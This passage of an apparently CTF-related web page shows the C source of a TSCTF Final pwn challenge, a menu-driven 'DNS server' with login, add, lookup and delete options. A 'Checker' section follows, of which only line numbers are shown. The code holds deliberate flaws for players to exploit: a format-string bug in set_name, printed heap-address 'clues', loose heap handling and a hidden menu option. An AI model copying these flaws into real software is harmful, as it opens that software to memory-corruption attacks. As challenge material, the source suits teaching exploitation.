class="string">"*******************************************\n"</span></span><br><span class="line">	<span class="string">"*  _____   _____   _____   _____   _____  *\n"</span>    </span><br><span class="line">	<span class="string">"* |_   _| /  ___/ /  ___| |_   _| |  ___| *\n"</span>    </span><br><span class="line">	<span class="string">"*   | |   | |___  | |       | |   | |__   *\n"</span></span><br><span class="line">	<span class="string">"*   | |   \\___  \\ | |       | |   |  __|  *\n"</span>   </span><br><span class="line">	<span class="string">"*   | |    ___| | | |___    | |   | |     *\n"</span></span><br><span class="line">	<span class="string">"*   |_|   /_____/ \\_____|   |_|   |_|     *\n"</span> </span><br><span class="line">	<span class="string">"*                                         *\n"</span></span><br><span class="line">	<span class="string">"* ------ Welcome to TSCTF FINAL --------- *\n"</span></span><br><span class="line">	<span class="string">"* ------     Have a nice day    --------- *\n"</span></span><br><span class="line">	<span class="string">"*  _____   _   __   _       ___   _       *\n"</span>      </span><br><span class="line">	<span class="string">"* |  ___| | | |  \\ | |     /   | | |      *\n"</span>     </span><br><span class="line">	<span class="string">"* | |__   | | |   \\| |    / /| | | |      *\n"</span>     </span><br><span class="line">	<span class="string">"* |  __|  | | | |\\   |   / / | | | |      *\n"</span>     </span><br><span class="line">	<span class="string">"* | |     | | | | \\  |  / /  | | | |___   *\n"</span>  </span><br><span class="line">	<span class="string">"* |_|     |_| |_|  \\_| /_/   |_| |_____|  *\n"</span></span><br><span class="line">	<span class="string">"*******************************************\n"</span></span><br><span class="line">		<span class="string">"\n"</span>;</span><br><span class="line">    <span class="built_in">puts</span>(logo);</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">	setvbuf(<span class="built_in">stderr</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">    signal(<span class="number">14</span>,handler);	</span><br><span class="line">	alarm(<span class="number">200</span>);</span><br><span class="line">    srand((<span class="keyword">unsigned</span>) time(<span class="literal">NULL</span>)/<span class="number">60</span>);</span><br><span class="line">    visitor_name = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(visitor_name,<span class="string">"anonym"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">menu</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"==GOD.ZE DNS Server=="</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"1. Login"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"2. Add a DNS item"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"3. Parsing domain names "</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"4. Delete  DNS item"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"5. Exit"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"====================="</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">menu1</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"=====MENU======"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"1. set name"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"2. set motto"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"3. show motto"</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"4. Exit"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"==============="</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">maybe_real_set_name</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">"%7s"</span>,visitor_name);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"OK, I know your name :"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(visitor_name);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_name</span><span class="params">()</span></span>&#123;</span><br><span class="line">	maybe_real_set_name();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_motto</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> buffer[<span class="number">0x200</span>] ;</span><br><span class="line">	read_n(buffer,<span class="number">0x200</span>);</span><br><span class="line">	motto = strdup(buffer);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">login</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (login_flag != <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	<span class="keyword">char</span> * fmt = <span class="string">"%d"</span>;</span><br><span class="line">	<span class="keyword">int</span> opt;</span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"&gt;"</span>);</span><br><span class="line">		<span class="keyword">if</span>(<span class="built_in">scanf</span>(fmt,&amp;opt)&lt;=<span class="number">0</span>)&#123;</span><br><span class="line">			<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">switch</span>(opt)&#123;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">				<span class="keyword">if</span>((login_flag &amp; <span class="number">0x01</span>)==<span class="number">0</span>)&#123;</span><br><span class="line">					login_flag = login_flag|<span class="number">0x01</span>;</span><br><span class="line">					<span class="built_in">printf</span>(<span class="string">"name:"</span>);</span><br><span class="line">					set_name();</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">				<span class="keyword">if</span>((login_flag &amp;<span class="number">0x10</span>) == <span class="number">0</span>)&#123;</span><br><span class="line">					login_flag = login_flag|<span class="number">0x10</span>;</span><br><span class="line">					<span class="built_in">printf</span>(<span class="string">"motto:"</span>);</span><br><span class="line">					set_motto();</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">				<span class="keyword">if</span>((login_flag &amp;<span class="number">0x100</span>) == <span class="number">0</span>)&#123;</span><br><span class="line">					login_flag = login_flag|<span class="number">0x100</span>;</span><br><span class="line">					<span class="keyword">if</span>(motto!=<span class="number">0</span>)</span><br><span class="line">					<span class="built_in">puts</span>(motto);</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">break</span>;	</span><br><span class="line">			<span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">				<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">default</span>:</span><br><span class="line">				<span class="built_in">puts</span>(<span class="string">"invalid options\n"</span>);</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">read_n</span><span class="params">(<span class="keyword">char</span> *src,<span class="keyword">int</span> len)</span></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; len; i++ )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( read(<span class="number">0</span>, (<span class="keyword">void</span> *)(i + src), <span class="number">1</span>) != <span class="number">1</span> )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">if</span> ( *(src+i) == <span class="number">10</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *(src+i) = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">return</span> i;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> i;	</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">read_int</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> nptr[<span class="number">16</span>];</span><br><span class="line">	read_n(nptr, <span class="number">0xA</span>);</span><br><span class="line">  	<span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span>)atoi(nptr);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">check_format</span><span class="params">(<span class="keyword">char</span> *ip)</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> num =<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x20</span>;i++)&#123;</span><br><span class="line">		<span class="keyword">if</span>(ip[i]==<span class="string">'.'</span>)&#123;</span><br><span class="line">			num += <span class="number">1</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(num!=<span class="number">3</span>)&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add_DNS</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">DNS_Node</span> * <span class="title">tmp</span>;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> len,i;</span><br><span class="line">	<span class="keyword">char</span> *remark;</span><br><span class="line">	<span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">31</span> &amp;&amp; DNS_Node_List[i]; ++i )</span><br><span class="line">		;</span><br><span class="line">	<span class="keyword">if</span> ( i == <span class="number">32</span> )</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">	tmp = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct DNS_Node));</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"ψ(｀∇´)ψ: Let me leave some clue [%03x]\n"</span>,((<span class="keyword">unsigned</span> <span class="keyword">int</span>)tmp&amp;<span class="number">0xfff</span>));</span><br><span class="line">	<span class="built_in">strcpy</span>(tmp-&gt;user,visitor_name);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"input domain: "</span>);</span><br><span class="line">	read_n(tmp-&gt;domain,<span class="number">0x30</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"input length:"</span>);</span><br><span class="line">	len =read_int();</span><br><span class="line">	remark = <span class="built_in">malloc</span>(len+<span class="number">0x20</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"ψ(｀∇´)ψ: Let me leave some clue [%03x]\n"</span>,((<span class="keyword">unsigned</span>)remark&amp;<span class="number">0xfff</span>));</span><br><span class="line">	tmp-&gt;ptr = remark;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"input remark:"</span>);</span><br><span class="line">	read_n(remark+<span class="number">0x20</span>,len);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"input IP:"</span>);</span><br><span class="line">	read_n(remark,<span class="number">0x20</span>);</span><br><span class="line">	<span class="keyword">if</span>(check_format(remark)!=<span class="number">0</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"error input,bye!\n"</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	DNS_Node_List[i]=tmp;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Complete\n"</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">parse_domain</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> domain[<span class="number">0x30</span>];</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">DNS_Node</span> *<span class="title">tmp</span>=0;</span></span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Give me ur domain:"</span>);</span><br><span class="line">	read_n(domain,<span class="number">0x30</span>);</span><br><span class="line">	<span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">31</span>; ++i )</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> ( DNS_Node_List[i] &amp;&amp; !<span class="built_in">strcmp</span>(domain, DNS_Node_List[i]-&gt;domain) )</span><br><span class="line">		&#123;</span><br><span class="line">			tmp = DNS_Node_List[i];</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"adder : %s\n"</span>,tmp-&gt;user );</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"IP    : %s\n"</span>,tmp-&gt;ptr );</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"remark: %s\n"</span>,(tmp-&gt;ptr + <span class="number">0x20</span>));</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"---------------------------\n"</span>);</span><br><span class="line">    	&#125;</span><br><span class="line">  	&#125;</span><br><span class="line">  	<span class="keyword">if</span> ( !tmp )</span><br><span class="line">    	<span class="built_in">puts</span>(<span class="string">"not find!!"</span>);	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete_DNS</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> domain[<span class="number">0x30</span>];</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">DNS_Node</span> *<span class="title">tmp</span>;</span></span><br><span class="line">	<span class="keyword">int</span> i,zero,j;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Give me bad domain:"</span>);</span><br><span class="line">	read_n(domain,<span class="number">0x30</span>);</span><br><span class="line">	zero = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">31</span>; ++i )</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> ( DNS_Node_List[i] &amp;&amp; !<span class="built_in">strcmp</span>(domain, DNS_Node_List[i]-&gt;domain) &amp;&amp; !<span class="built_in">strcmp</span>(visitor_name,DNS_Node_List[i]-&gt;user) )</span><br><span class="line">		&#123;</span><br><span class="line">			zero = <span class="number">1</span>;</span><br><span class="line">			tmp = DNS_Node_List[i];</span><br><span class="line">			j=i;</span><br><span class="line">			<span class="built_in">free</span>(tmp-&gt;ptr);</span><br><span class="line">			<span class="built_in">free</span>(tmp);</span><br><span class="line">    	&#125;</span><br><span class="line">  	&#125;	</span><br><span class="line">  	<span class="keyword">if</span>(zero)&#123;</span><br><span class="line">  		DNS_Node_List[j]=<span class="number">0</span>;</span><br><span class="line">  		<span class="built_in">printf</span>(<span class="string">"complete\n"</span> );</span><br><span class="line">  	&#125;</span><br><span class="line">  	<span class="keyword">else</span>&#123;</span><br><span class="line">  		<span class="built_in">puts</span>(<span class="string">"not find!!"</span>);</span><br><span class="line">  	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">asm</span>(</span><br><span class="line">        <span class="string">"shr $0x16,%rsp\n"</span></span><br><span class="line">        <span class="string">"shl $0x16,%rsp\n"</span></span><br><span class="line">        <span class="string">"xor $0x188,%rsp\n"</span></span><br><span class="line">        <span class="string">"push %rbp\n"</span></span><br><span class="line">        <span class="string">"mov %rsp,%rbp\n"</span></span><br><span class="line">        <span class="string">"sub $0x20,%rsp\n"</span></span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">int</span> option;</span><br><span class="line">	init();</span><br><span class="line">	<span class="comment">//menu();</span></span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">		menu();</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"&gt;"</span>);</span><br><span class="line">		<span class="keyword">if</span>(<span class="built_in">scanf</span>(<span class="string">"%u"</span>,&amp;option)&lt;=<span class="number">0</span>)&#123;</span><br><span class="line">			<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">switch</span>(option)&#123;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">				menu1();</span><br><span class="line">				login();</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">				add_DNS();</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">				parse_domain();</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">				delete_DNS();</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">				<span class="built_in">puts</span>(<span class="string">"=͟͟͞͞ =͟͟͞͞ ﾍ( ´Д`)ﾉ :"</span>);</span><br><span class="line">				<span class="built_in">puts</span>(<span class="string">"              [Don't leave me alone, I can give u sh311 !]"</span>);</span><br><span class="line">				<span class="built_in">puts</span>(<span class="string">"              "</span>);</span><br><span class="line">				<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">0xbabe</span>:</span><br><span class="line">				game();</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">//login();</span></span><br><span class="line">		<span class="comment">//game();</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">NODE -&gt; USER(8) + DOMAIN(0X30) +PTR(8)</span></span><br><span class="line"><span class="comment">CONTENT -&gt; DNS(0X20) + CONTENT(~)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">c</span><br></pre></td></tr></table></figure>
<h2 id="Checker"><a href="#Checker" class="headerlink" title="Checker"></a>Checker</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span 